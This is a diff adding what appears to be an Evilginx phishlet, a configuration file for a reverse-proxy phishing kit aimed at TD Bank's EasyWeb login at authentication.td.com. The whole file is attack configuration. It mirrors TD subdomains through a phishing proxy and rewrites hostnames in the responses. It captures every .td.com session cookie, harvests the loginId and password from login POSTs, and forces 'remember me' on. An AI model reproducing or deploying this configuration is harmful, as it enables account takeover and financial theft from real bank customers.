@@ -1,0 +1,58 @@
+author: '@longwu'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'authentication', orig_sub: 'authentication', domain: 'td.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'bcdn', orig_sub: 'bcdn', domain: 'td.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'wcmcaas.td.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'wup', orig_sub: 'wup', domain: 'td.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'td', orig_sub: 'td', domain: 'demdex.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'tmx', orig_sub: 'tmx', domain: 'td.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'smetrics', orig_sub: 'smetrics', domain: 'td.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'td.com', session: true, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'authentication.td.com', orig_sub: 'authentication', domain: 'td.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'authentication.td.com', orig_sub: 'authentication', domain: 'td.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'authentication.td.com', orig_sub: 'bcdn', domain: 'td.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'authentication.td.com', orig_sub: 'bcdn', domain: 'td.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'authentication.td.com', orig_sub: 'www', domain: 'wcmcaas.td.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'authentication.td.com', orig_sub: 'www', domain: 'wcmcaas.td.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'authentication.td.com', orig_sub: 'wup', domain: 'td.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'authentication.td.com', orig_sub: 'wup', domain: 'td.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'authentication.td.com', orig_sub: 'td', domain: 'demdex.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'authentication.td.com', orig_sub: 'td', domain: 'demdex.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'authentication.td.com', orig_sub: 'tmx', domain: 'td.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'authentication.td.com', orig_sub: 'tmx', domain: 'td.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'authentication.td.com', orig_sub: 'smetrics', domain: 'td.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'authentication.td.com', orig_sub: 'smetrics', domain: 'td.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'authentication.td.com', orig_sub: 'www', domain: 'td.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'authentication.td.com', orig_sub: 'www', domain: 'td.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+auth_tokens:
+  - domain: '.td.com'
+    keys: ['.*,regexp']
+
+auth_urls:
+  - ''
+  - ''
+
+credentials:
+  username:
+    key: 'loginId'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+force_post:
+  - path: '/uap-ui/?consumer=easyweb&locale=en_CA#/uap/login'
+    force:
+      - {key: 'rememberMe', value: 'true'}
+    type: 'post'
+
+login:
+  domain: 'authentication.td.com'
+  path: '/uap-ui/?consumer=easyweb&locale=en_CA#/uap/login'
